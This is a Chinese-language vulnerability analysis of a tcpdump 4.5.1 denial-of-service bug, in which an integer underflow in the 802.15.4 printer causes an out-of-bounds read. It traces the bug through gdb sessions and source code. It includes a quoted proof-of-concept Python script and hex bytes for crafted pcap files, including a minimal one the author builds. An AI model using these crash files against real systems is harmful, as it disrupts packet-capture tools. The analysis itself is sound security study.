# 从源码分析tcpdump拒绝服务漏洞

## 0. 前言

这个漏洞k0shl有分析过，我也是看了他的[分析](https://whereisk0shl.top/post/2016-10-23-1)才决定自己分析一遍的，最终得到的结论也有一些差异。此外，由于tcpdump本身就是有源码的，所以我是从源码和gdb动态调试两个方向同时进行分析，更加方便理解。

## 1. 环境&准备

### 1.1虚拟机操作系统

kali 2020.3 x86

### 1.2 tcpdump安装

```bash
# 卸载默认安装的tcpdump
apt-get --purge remove tcpdump   
# 安装依赖包
apt install flex
apt install bison
# 安装libpcap
wget http://www.tcpdump.org/release/libpcap-1.5.3.tar.gz
tar -zxvf libpcap-1.5.3.tar.gz
cd libpcap-1.5.3
./configure
make
make install
# 安装tcpdump
wget http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz
tar -zxvf tcpdump-4.5.1.tar.gz
cd tcpdump-4.5.1
./configure
make
make install
# 验证安装
tcpdump --version
```

### 1.3 poc.py文件

```python
# Exploit Title: tcpdump 4.5.1 Access Violation Crash
# Date: 31st May 2016
# Exploit Author: David Silveiro
# Vendor Homepage: http://www.tcpdump.org
# Software Link: http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz
# Version: 4.5.1
# Tested on: Ubuntu 14 LTS

from subprocess import call
from shlex import split
from time import sleep


def crash():

    command = 'tcpdump -r crash'

    buffer     =   '\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff'
    buffer     +=  '\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00'
    buffer     +=  '\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00<\x9c7@\xff\x00'
    buffer     +=  '\x06\xa0r\x7f\x00\x00\x01\x7f\x00\x00\xec\x00\x01\xe0\x1a'
    buffer     +=  "\x00\x17g+++++++\x85\xc9\x03\x00\x00\x00\x10\xa0&\x80\x18\'"
    buffer     +=  "xfe$\x00\x01\x00\x00@\x0c\x04\x02\x08\n', '\x00\x00\x00\x00"
    buffer     +=  '\x00\x00\x00\x00\x01\x03\x03\x04'


    with open('crash', 'w+b') as file:
        file.write(buffer)

    try:
        call(split(command))
        print("Exploit successful!             ")

    except:
        print("Error: Something has gone wrong!")


def main():

    print("Author:   David Silveiro                           ")
    print("   tcpdump version 4.5.1 Access Violation Crash    ")

    sleep(2)

    crash()


if __name__ == "__main__":
    main()
```

### 1.4 crash文件介绍

#### 1.4.1 文件内容

该文件可以通过运行上面的python文件获得。

```
0000h:	D4 C3 B2 A1 02 00 04 00 | 00 00 00 F5 FF 00 00 00
0010h:	49 00 00 00 E6 00 00 00 | 00 80 00 00 00 00 00 00
0020h:	08 00 00 00 00 3C 9C 37 | 40 FF 00 06 A0 72 7F 00
0030h:	00 01 7F 00 00 EC 00 01 | E0 1A 00 17 67 2B 2B 2B
0040h:	2B 2B 2B 2B 85 C9 03 00 | 00 00 10 A0 26 80 18 27
0050h:	78 66 65 24 00 01 00 00 | 40 0C 04 02 08 0A 27 2C
0060h:	20 27 00 00 00 00 00 00 | 00 00 01 03 03 04
```

#### 1.4.2 文件结构

- 24字节`pcap_file_header` 

- 16字节`pcap_pkthdr`
  - 8字节时间戳
  - 4字节`caplen`
  - 4字节`len`

- 数据

更详细的介绍会在**3.1 构建自己的poc**中。

## 2. 漏洞分析

### 2.1 获取函数调用栈

使用`gdb`执行`tcpdump`，然后执行`run -r crash`，因为访问未授权地址，程序停止执行：

```bash
root@kali:~/tcpdump-dos# gdb tcpdump

gdb-peda$ run -r crash
Starting program: /usr/local/sbin/tcpdump -r crash
05:06:08.000000 IEEE 802.15.4 Beacon packet 
	0x0000:  ffff ffe7 3710 e0ff ffff ffe8 270f f0ff  ....7.......'...
	0x0010:  ffff ffe9 16f2 e0ff ffff ffea 06f1 f0ff  ................
	0x0020:  ffff ffea f6d4 e0ff ffff ffeb e6d3 f0ff  ................
	0x0030:  ffff ffec d6b6 e011 0000 0050 de5e 0020  ...........P.^..
	0x0040:  d85e 0000 0000 0041 0000 0070 e25e 0000  .^.....A...p.^..
	0x0050:  0000 0000 0000 0001 0000 0001 0000 0001  ................
	0x0060:  0000 0000 0000 0000 0000 006d 646e 7334  ...........mdns4
	0x0070:  5f6d 696e 696d 616c 0000 00f5 4f78 70ff  _minimal....Oxp.
	0x0080:  ffff fff6 3f5b 6011 0000 0000 0000 0078  ....?[`........x
	0x0090:  47fb b700 0000 0031 0000 0040 d65e 0000  G......1...@.^..
	0x00a0:  0000 0000 0000 0000 0000 0001 0000 0001  ................
	0x00b0:  0000 0000 0000 0000 0000 0064 6200 0000  ...........db...
	0x00c0:  0000 0000 0000 0031 0000 0000 0000 0000  .......1........
	0x00d0:  0000 0000 0000 0000 0000 0001 0000 0001  ................
	0x00e0:  0000 0000 0000 0000 0000 0066 696c 6573  ...........files
	0x00f0:  0000 0000 0000 0021 0000 00f0 d65e 0090  .......!.....^..
	0x0100:  d65e 0073 6572 7669 6365 7300 0000 0000  .^.services.....
	0x0110:  0000 0000 0000 0031 0000 00c0 d65e 0000  .......1.....^..
	0x0120:  0000 0000 0000 0000 0000 0001 0000 0001  ................
	0x0130:  0000 0020 d85e 0020 dc5e 0064 6200 0000  .....^...^.db...
	0x0140:  0000 0000 0000 0031 0000 0000 0000 0000  .......1........
	0x0150:  0000 0000 0000 0000 0000 0001 0000 0001  ................
	......
	......
	0x219d0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x219e0:  0000 0000 0000 0000 0000 0000 0000 0000  .........
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0x51c000 --> 0x11beb0 
ECX: Cannot access memory address
EDX: 0xbfffe3c3 (0xbfffe3c3:    0x30303000)
ESI: 0x2e ('.')
EDI: 0x0 
EBP: 0xbfffe3dd ("......")
ESP: 0xbfffe370 --> 0xb7fcd110 --> 0xb7dcf000 --> 0x464c457f 
EIP: 0x41adc0 (<hex_and_ascii_print_with_offset+160>:   movzx  esi,BYTE PTR [ecx+0x1])
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x41adb3 <hex_and_ascii_print_with_offset+147>:      add    ebp,0x2
   0x41adb6 <hex_and_ascii_print_with_offset+150>:      cmp    ecx,DWORD PTR [esp+0x18]
   0x41adba <hex_and_ascii_print_with_offset+154>:      je     0x41aea8 <hex_and_ascii_print_with_offset+392>
=> 0x41adc0 <hex_and_ascii_print_with_offset+160>:      movzx  esi,BYTE PTR [ecx+0x1]
   0x41adc4 <hex_and_ascii_print_with_offset+164>:      movzx  edi,BYTE PTR [ecx]
   0x41adc7 <hex_and_ascii_print_with_offset+167>:      add    ecx,0x2
   0x41adca <hex_and_ascii_print_with_offset+170>:      sub    esp,0xc
   0x41adcd <hex_and_ascii_print_with_offset+173>:      mov    DWORD PTR [esp+0x1c0],ecx
[------------------------------------stack-------------------------------------]
0000| 0xbfffe370 --> 0xb7fcd110 --> 0xb7dcf000 --> 0x464c457f 
0004| 0xbfffe374 --> 0x5 
0008| 0xbfffe378 --> 0x0 
0012| 0xbfffe37c --> 0x0 
0016| 0xbfffe380 --> 0xbfffe3be (" 0000")
0020| 0xbfffe384 --> 0xbfffe3aa (" 0000 0000 0000 0000 0000")
0024| 0xbfffe388 --> 0x5ed567 --> 0x0 
0028| 0xbfffe38c --> 0xb7fce100 --> 0xb7f43380 --> 0x20002 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
hex_and_ascii_print_with_offset (ident=0x4a8c76 "\n\t", cp=0x60f000 <error: Cannot access memory at address 0x60f000>, length=0xfffffff3, oset=0x21a80)
    at ./print-ascii.c:90
90                      s1 = *cp++;

```

执行`bt`命令查看函数调用栈：

```bash
gdb-peda$ bt
#0  hex_and_ascii_print_with_offset (ident=0x4a8c76 "\n\t", cp=0x60f000 <error: Cannot access memory at address 0x60f000>, length=0xfffffff3, oset=0x21a80) at ./print-ascii.c:90
#1  0x0041afc6 in hex_and_ascii_print (ident=0x4a8c76 "\n\t", cp=0x5ed575 "\377\377\377\347\067\020\340\377\377\377\377\350'\017\360\377\377\377\377\351\026\362\340\377\377\377\377\352\006\361\360\377\377\377\377\352\366\324\340\377\377\377\377\353\346\323\360\377\377\377\377\354\340\021", length=0xfffffff3)  at ./print-ascii.c:127
#2  0x0046d533 in ndo_default_print (ndo=0x5eaac0 <Gndo>,  bp=0x5ed575 "\377\377\377\347\067\020\340\377\377\377\377\350'\017\360\377\377\377\377\351\026\362\340\377\377\377\377\352\006\361\360\377\377\377\377\352\366\324\340\377\377\377\377\353\346\323\360\377\377\377\377\354\340\021", length=0xfffffff3) at ./tcpdump.c:2053
#3  0x00418d47 in ieee802_15_4_if_print (ndo=0x5eaac0 <Gndo>, h=0xbfffe610, p=<optimized out>) at ./print-802_15_4.c:180
#4  0x0046dc08 in print_packet (user=0xbfffe790 "\300\252^", h=0xbfffe610, sp=0x5ed560 "@\377") at ./tcpdump.c:1950
#5  0x0048dcc8 in pcap_offline_read (p=0x5ed350, cnt=0xffffffff, callback=0x46dbb0 <print_packet>, user=0xbfffe790 "\300\252^")   at ./savefile.c:409
#6  0x0047fcc3 in pcap_loop (p=0x5ed350, cnt=0xffffffff, callback=0x46dbb0 <print_packet>, user=0xbfffe790 "\300\252^") at ./pcap.c:849
#7  0x00411b7d in main (argc=<optimized out>, argv=<optimized out>) at ./tcpdump.c:1569
#8  0xb7deddf6 in __libc_start_main (main=0x4108b0 <main>, argc=0x3, argv=0xbffff984, init=0x49bff0 <__libc_csu_init>,  fini=0x49c050 <__libc_csu_fini>, rtld_fini=0xb7fe6080 <_dl_fini>, stack_end=0xbffff97c) at ../csu/libc-start.c:308
#9  0x004129e1 in _start ()
```

从该命令的输出中，可以看到漏洞出现时的函数调用情况，以及每个函数所在的文件及其位置。总结如下表：

| 文件名             | 行数 | 函数名                            |
| ------------------ | ---- | --------------------------------- |
| `tcpdump.c`        | 1569 | `main`                            |
| `pcap.c`           | 849  | `pcap_loop`                       |
| `savefile.c`       | 409  | `pcap_offline_read`               |
| `tcpdump.c`        | 1950 | `print_packet`                    |
| `print-802_15_4.c` | 180  | `ieee802_15_4_if_print`           |
| `tcpdump.c`        | 2053 | `ndo_default_print`               |
| `print-ascii.c`    | 127  | `hex_and_ascii_print`             |
| `print-ascii.c`    | 90   | `hex_and_ascii_print_with_offset` |

从上面的信息，我们知道漏洞的发生是由于打印时引用了非法地址，但究竟是如何做到这一点的，还需要进一步分析。

### 2.2 代码跟进

跟随文件名及行数信息，找到`savefile.c`中的`pcap_offline_read`函数源码，在该文件的`400`行，有一个函数调用`status = p->next_packet_op(p, &h, &data);`，从该代码无法确定究竟调用了哪个函数，所以回到`gdb`，在`pcap_offline_read`函数处下断点`b pcap_offline_read`，然后执行`run -r crash`，`n`步进到该处函数调用，`s`步入：

```bash
gdb-peda$ s
[----------------------------------registers-----------------------------------]
EAX: 0xbfffe60c --> 0x0 
EBX: 0x51c000 --> 0x11beb0 
ECX: 0x0 
EDX: 0x1 
ESI: 0x5ed350 --> 0x48dc60 (<pcap_offline_read>:        push   ebp)
EDI: 0x0 
EBP: 0xbfffe610 --> 0xb7fe5539 (<_dl_fixup+9>:  add    ebx,0x19ac7)
ESP: 0xbfffe5dc --> 0x48dcec (<pcap_offline_read+140>:  add    esp,0x10)
EIP: 0x48e070 (<pcap_next_packet>:      push   ebp)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x48e06b:    xchg   ax,ax
   0x48e06d:    xchg   ax,ax
   0x48e06f:    nop
=> 0x48e070 <pcap_next_packet>: push   ebp
   0x48e071 <pcap_next_packet+1>:       push   edi
   0x48e072 <pcap_next_packet+2>:       push   esi
   0x48e073 <pcap_next_packet+3>:       push   ebx
   0x48e074 <pcap_next_packet+4>:       call   0x4129f0 <__x86.get_pc_thunk.bx>
[------------------------------------stack-------------------------------------]
0000| 0xbfffe5dc --> 0x48dcec (<pcap_offline_read+140>: add    esp,0x10)
0004| 0xbfffe5e0 --> 0x5ed350 --> 0x48dc60 (<pcap_offline_read>:        push   ebp)
0008| 0xbfffe5e4 --> 0xbfffe610 --> 0xb7fe5539 (<_dl_fixup+9>:  add    ebx,0x19ac7)
0012| 0xbfffe5e8 --> 0xbfffe60c --> 0x0 
0016| 0xbfffe5ec --> 0x0 
0020| 0xbfffe5f0 --> 0xb7fff000 --> 0x29f3c 
0024| 0xbfffe5f4 --> 0x400000 --> 0x464c457f 
0028| 0xbfffe5f8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
pcap_next_packet (p=0x5ed350, hdr=0xbfffe610, data=0xbfffe60c) at ./sf-pcap.c:399
399             struct pcap_sf *ps = p->priv;
```

发现该函数为`sf-pcap.c`文件`399`行的`pcap_next_packet`，打开该文件定位到函数位置，回到`gdb`步进查看函数执行流程。

```c
// sf-pcap.c
// 读取头部信息
412	amt_read = fread(&sf_hdr, 1, ps->hdrsize, fp);
// sf_hdr: esp+0x24=0xbfffe5a8; ps->hdrsize: 0x10; 
// 执行后：0xbfffe5a8:     0x00008000      0x00000000      0x00000008      0x379c3c00
439	hdr->caplen = sf_hdr.caplen;			// 0x08
440	hdr->len = sf_hdr.len;					// 0x379c3c00
441	hdr->ts.tv_sec = sf_hdr.ts.tv_sec;
442	hdr->ts.tv_usec = sf_hdr.ts.tv_usec;
// 读取数据包
546	amt_read = fread(p->buffer, 1, hdr->caplen, fp);
// p->buffer: [esp+0x5c]+0x14=0x5ed560; hdr->caplen: 0x8
// 执行后：0x5ed560:       0x0600ff40      0x007f72a0      0x00000000      0x00000000
560	*data = p->buffer;
```

根据上面对于执行流程的监控，可以发现`pcap_next_packet`函数根据数据包头部的`caplen`信息读入了8字节的数据`0x0600ff40 0x007f72a0`。也就是说，`pcap_offline_read`函数中的`status = p->next_packet_op(p, &h, &data);`语句，参数`data`最终指向的就是这8字节数据，参数地址为`0x5ed560`。

回到`pcap_offline_read`函数，第409行，执行了`(*callback)(user, &h, data);`，即`print_packet`函数。

找到`tcpdump.c`文件中的`print_packet`函数：

```c
// tcpdump.c
1947	snapend = sp + h->caplen;
1948
1949    if(print_info->ndo_type) {
1950            hdrlen = (*print_info->p.ndo_printer)(print_info->ndo, h, sp); // 这里！
1951    } else {
1952            hdrlen = (*print_info->p.printer)(h, sp);
1953    }
```

其中`h`就是之前读取的头部信息，`sp`就是8字节的数据。

**需要注意的地方来了！**

这里调用的就是`print-802_15_4.c` 中的 `ieee802_15_4_if_print`函数，在该函数的最后，调用了`ndo_default_print`：

```c
// print-802_15_4.c
179	if (!suppress_default_print)
180		(ndo->ndo_default_print)(ndo, p, caplen);
```

之后的两个函数只是在添加参数的基础上调用新的函数，并没有什么内容：

```c
// tcpdump.c
2050	static void
2051	ndo_default_print(netdissect_options *ndo _U_, const u_char *bp, u_int length)
2052	{
2053		hex_and_ascii_print("\n\t", bp, length); 
2054	}

// print-ascii.c
123	void
124	hex_and_ascii_print(register const char *ident, register const u_char *cp,
125	    register u_int length)
126	{
127		hex_and_ascii_print_with_offset(ident, cp, length, 0);
128	}
```

直接查看`hex_and_ascii_print_with_offset`函数：

```c
// print-ascii.c
76	void
77	hex_and_ascii_print_with_offset(register const char *ident,
78	    register const u_char *cp, register u_int length, register u_int oset)
79	{
80		register u_int i;
81		register int s1, s2;
82		register int nshorts;
83		char hexstuff[HEXDUMP_SHORTS_PER_LINE*HEXDUMP_HEXSTUFF_PER_SHORT+1], *hsp;
84		char asciistuff[ASCII_LINELENGTH+1], *asp;
85
86		nshorts = length / sizeof(u_short);
87		i = 0;
88		hsp = hexstuff; asp = asciistuff;
89		while (--nshorts >= 0) {
90			s1 = *cp++;				// 这里！
91			s2 = *cp++;				
92			(void)snprintf(hsp, sizeof(hexstuff) - (hsp - hexstuff),
93			    " %02x%02x", s1, s2);
```

该函数使用参数`length`计算了一个长度用来控制循环，然后逐步访问参数`cp`（也就是从数据包读入的数据）指向的内存空间，也就是这里发生了越界访问，导致了拒绝服务。

现在我们需要回顾一下`length`参数究竟是什么了！

### 2.3 漏洞成因

可能你会认为这个`length`就是之前读入的`caplen`，也就是`0x8`，但事实并非如此。

上一小节中有一个加粗字体不知道你有没有注意到，就是在 `ieee802_15_4_if_print`函数中，`caplen`的值发生了变化。

让我们在`gdb`中跟进一下这个函数，同时和源码对应，看一下这个函数做了一些什么：

```c
// print-802_15_4.c
92	u_int
93	ieee802_15_4_if_print(struct netdissect_options *ndo,
94	                      const struct pcap_pkthdr *h, const u_char *p)
    // p: 0x5ed560 --> 0x600ff40 （即0x40ff0006）
95	{
96		u_int caplen = h->caplen;				// 0x8
97		int hdrlen;
98		u_int16_t fc;
99		u_int8_t seq;
......
106		fc = EXTRACT_LE_16BITS(p);				// fc: 0xff40
107		hdrlen = extract_header_length(fc);		// hdrlen: 0x12
108
109		seq = EXTRACT_LE_8BITS(p + 2);			// seq: 0x00
110
111		p += 3;									// p: 0x5ed563->0x7f72a006（即0x06a0727f）
112		caplen -= 3;							// caplen: 0x5
113	
114		ND_PRINT((ndo,"IEEE 802.15.4 %s packet ", ftypes[fc & 0x7]));
......
123		if (!vflag) {
124			p+= hdrlen;							// p: 0x5ed575->0xe7ffffff（即0xffffffe7）
125			caplen -= hdrlen;					// caplen: 0xfffffff3=-13
126		} else {
......
177		}
178	
179		if (!suppress_default_print)
180			(ndo->ndo_default_print)(ndo, p, caplen);
181
182		return 0;
183	}
```

根据上面的调试结果，该函数会对读取出来的数据中的前两个字节进行一些运算，计算出ieee802.15.4包的头部长度，这里计算出来的是`0x12`，而ieee802.15.4包的总长度也只有`0x8`，再减去前3个字节，最后得到的传入`ndo_default_print`的参数`caplen`就是一个负数了。

*注：这里的计算涉及到了ZigBee包格式的问题，感兴趣的朋友可以参考[这个网址](https://www.rfwireless-world.com/Tutorials/Zigbee-MAC-layer-frame-format.html)*

接下来我们直接在`gdb`中步进到`hex_and_ascii_print_with_offset`函数内，看一下长度计算那里的结果是什么。这里从汇编代码比较好：

```assembly
   0x41ad35 <hex_.._offset+21>:	mov    esi,DWORD PTR [esp+0x1b8]	; length:0xfffffff3
   0x41ad3c <hex_.._offset+28>:	mov    edx,DWORD PTR [esp+0x1b4]	; cp: 0x5ed575->0xe7ffffff
=> 0x41ad43 <hex_.._offset+35>:	mov    eax,esi
   0x41ad45 <hex_.._offset+37>:	and    eax,0x1
   0x41ad48 <hex_.._offset+40>:	shr    esi,1	; nshorts: 0x7ffffff9=2147483641
```

注意到除法操作（右移一位）之后，原本的负数变成了极大的正数。

```assembly
0x0041ad6c <+76>:    lea    eax,[edx+esi*2]		; eax: 0x5ed567=0x5ed575+0x7ffffff9*2
   												;			   =0x5ed575-0xe
0x0041ad6f <+79>:    mov    DWORD PTR [esp+0x18],eax	; [esp+0x18]: 0x5ed567
......
0x0041adc0 <+160>:   movzx  esi,BYTE PTR [ecx+0x1]	; 发生漏洞的地方！
0x0041adc4 <+164>:   movzx  edi,BYTE PTR [ecx]
......
0x0041ae9e <+382>:   cmp    ecx,DWORD PTR [esp+0x18]	; ecx: 数据包遍历地址>=0x5ed575
														; [esp+0x18]: 0x5ed567
0x0041aea2 <+386>:   jne    0x41adc0 <hex_and_ascii_print_with_offset+160>
```

注意这里循环停止的判断方式，函数使用`baseAddress+nshorts*2`的方式计算截至地址，但是由于整数溢出，导出结果小于基地址。这就导致判断循环结束的条件无法到达，函数会一直从基地址`0x5ed575`开始遍历，最终访问到未授权的内存地址。

## 3. crash数据包分析

poc的python代码本身并没有什么需要分析的地方，就是把crash数据包的内容写入到了`crash`文>件中，所以主要是看一下`crash`文件的内容。再次贴一下它的内容：

> 0000h:	D4 C3 B2 A1 02 00 04 00 | 00 00 00 F5 FF 00 00 00
> 0010h:	49 00 00 00 E6 00 00 00 | 00 80 00 00 00 00 00 00
> 0020h:	**08 00 00 00** 00 3C 9C 37 | **40 FF** 00 06 A0 72 7F 00
> 0030h:	00 01 7F 00 00 EC 00 01 | E0 1A 00 17 67 2B 2B 2B
> 0040h:	2B 2B 2B 2B 85 C9 03 00 | 00 00 10 A0 26 80 18 27
> 0050h:	78 66 65 24 00 01 00 00 | 40 0C 04 02 08 0A 27 2C
> 0060h:	20 27 00 00 00 00 00 00 | 00 00 01 03 03 04

在**1.4 crash文件介绍**中，我已经简单介绍了该数据包的内容和结构。根据上面对于漏洞的分析，产生漏洞的主要原因就是内容中加粗的两个部分，这两部分的内容导入最终代码计算出来的ieee802.15.4包内容的长度是负数，从而产生整数溢出。

所以该漏洞的出现和`00 3C 9C 37`没有关系，也和`0030h-006Dh`的内容没有关系。

那么下面这个数据包应该也会引发漏洞：

```
0000h:	D4 C3 B2 A1 02 00 04 00 | 00 00 00 F5 FF 00 00 00
0010h:	49 00 00 00 E6 00 00 00 | 00 80 00 00 00 00 00 00
0020h:	08 00 00 00 08 00 00 00 | 40 FF 00 06 A0 72 7F 00
```

我使用上面的数据构建了一个`crash1`文件，在命令行执行`tcpdump -r crash1`，确实引发的漏洞：

```
05:06:08.000000 IEEE 802.15.4 Beacon packet 
	0x0000:  ffff ffe7 3710 e0ff ffff ffe8 270f f0ff  ....7.......'...
	0x0010:  ffff ffe9 16f2 e0ff ffff ffea 06f1 f0ff  ................
	0x0020:  ffff ffea f6d4 e0ff ffff ffeb e6d3 f0ff  ................
	0x0030:  ffff ffec d6b6 e011 0000 0050 7ead 0120  ...........P~...
	0x0040:  78ad 0100 0000 0041 0000 0070 82ad 0100  x......A...p....
	0x0050:  0000 0000 0000 0001 0000 0001 0000 0001  ................
	0x0060:  0000 0000 0000 0000 0000 006d 646e 7334  ...........mdns4
	0x0070:  5f6d 696e 696d 616c 0000 00f5 4f78 70ff  _minimal....Oxp.
	0x0080:  ffff fff6 3f5b 6011 0000 0000 0000 0078  ....?[`........x
......
    0x219f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x21a00:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x21a10:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x21a20:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x21a30:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x21a40:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x21a50:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x21a60:  0000 0000 0000 0000 0000 0000 0000 0000  ................
Segmentation fault
```

### 3.1 构建自己的poc

所以如果想要自己构建一个针对该漏洞的poc，只要了解pcap文件的格式就可以了。

#### 3.1.1 24字节的pcap文件头

```c
struct pcap_file_header {
        bpf_u_int32 magic;		// D4 C3 B2 A1
        u_short version_major;	// 02 00
        u_short version_minor;	// 04 00
        bpf_int32 thiszone;     // 00 00 00 00
        bpf_u_int32 sigfigs;    // 00 00 00 00
        bpf_u_int32 snaplen;    // 10 00 00 00 最大抓包长度
        bpf_u_int32 linktype;   // 49 00 00 00 链路类型
};
```

#### 3.1.2 16字节的包头

```c
struct pcap_pkthdr {
        struct timeval ts;      // 00 00 00 00 00 00 00 00 
        bpf_u_int32 caplen;     // 08 00 00 00
        bpf_u_int32 len;       	// 08 00 00 00 这个值一般<=caplen，但也可以任意
};
```

#### 3.1.3 caplen字节的数据

```c
40 FF 00 00 00 00 00 00
```

上面的数据中，凡是没有明确要求的全部设成了0。注意`caplen`字段，以及数据部分的前两个字节其实也不是固定的，只要最后能够计算出负数的长度就可以，可以根据源码自己选取字段内容。

最后组合成的数据包为：

```
D4 C3 B2 A1 02 00 04 00 | 00 00 00 00 00 00 00 00
10 00 00 00 49 00 00 00 | 00 00 00 00 00 00 00 00
08 00 00 00 08 00 00 00 | 40 FF 00 00 00 00 00 00
```

使用tcpdump打开该数据包，也成功引发了漏洞。

把python代码中的`buffer`改成自己构建的`crash`文件内容，就是一个完整的poc了。

## 4. 参考资料

- https://whereisk0shl.top/post/2016-10-23-1
- https://www.rfwireless-world.com/Tutorials/Zigbee-MAC-layer-frame-format.html